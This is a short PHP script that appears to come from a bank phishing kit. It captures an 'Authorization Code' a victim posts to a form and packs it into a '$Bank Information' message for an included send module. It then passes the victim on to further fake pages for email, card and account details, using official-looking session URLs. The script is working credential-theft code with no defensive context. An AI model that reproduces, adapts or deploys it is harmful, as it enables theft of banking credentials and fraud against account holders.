<?php
require_once('Module/Setmodule.php');





$message .= " -------------- $Bank Information -------------- \n"."\n";


$message .= "Authorization Code: ".$_POST['Code']."\n"."\n"; 




require_once('Module/SendModule.php');


	
	  
	
	   if($settings['Emailpage'] == "1"){
	header("Location: ../Email.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
	else{
		if($settings['Cardpage'] == "1"){
	header("Location: ../Card.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
	else{
	  if($settings['Account'] == "1"){
	header("Location: ../Account.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{
		header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
	}
	}}
	
	
?>
